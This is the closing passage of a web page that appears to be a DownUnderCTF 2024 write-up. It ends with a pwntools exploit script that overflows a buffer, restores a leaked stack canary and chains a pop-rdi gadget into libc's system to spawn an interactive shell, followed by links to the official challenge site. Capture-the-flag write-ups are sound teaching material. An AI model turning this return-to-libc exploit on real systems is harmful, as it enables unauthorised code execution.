<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">offset_to_vaddr</span><span class="p">(</span><span class="mh">0x050d70</span><span class="p">)</span>

<span class="c1"># pop rdi</span>
<span class="n">gadgetPopRdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">offset_to_vaddr</span><span class="p">(</span><span class="mh">0x000000000002a3e5</span><span class="p">)</span>
<span class="c1"># xor rax, rax, ret</span>
<span class="n">gadgetNop</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">offset_to_vaddr</span><span class="p">(</span><span class="mh">0x00000000000baaf9</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
    <span class="sa">b</span><span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mi">88</span><span class="p">,</span>
    <span class="n">pack</span><span class="p">(</span><span class="n">canary</span><span class="p">),</span>
    <span class="n">pack</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
    <span class="n">pack</span><span class="p">(</span><span class="n">gadgetPopRdi</span><span class="p">),</span>
    <span class="n">pack</span><span class="p">(</span><span class="n">sh_offset</span><span class="p">),</span>
    <span class="n">pack</span><span class="p">(</span><span class="n">gadgetNop</span><span class="p">),</span>
    <span class="n">pack</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="p">)</span>

<span class="c1"># send payload as name</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="c1"># exit main which will execute return-to-libc</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></td></tr></table></div>
</details>
<h2 id="epilogue">Epilogue<a class="headerlink" href="#epilogue" title="Permanent link">&para;</a></h2>
<ul>
<li>Official website: <a href="https://downunderctf.com/">https://downunderctf.com/</a></li>
<li>Official writeups: <a href="https://github.com/DownUnderCTF/Challenges_2024_Public">https://github.com/DownUnderCTF/Challenges_2024_Public</a></li>
</ul>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../decrypt_eval/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Decrypt then eval">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                Decrypt then eval
              </div>
            </div>
          </a>
        
        
          
          <a href="../dna/" class="md-footer__link md-footer__link--next" aria-label="Next: DNAdecay">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                DNAdecay
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.footer", "content.action.edit"], "search": "../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../assets/javascripts/bundle.c8d2eff1.min.js"></script>
      
        <script src="../search/main.js"></script>
      
    
  </body>
</html>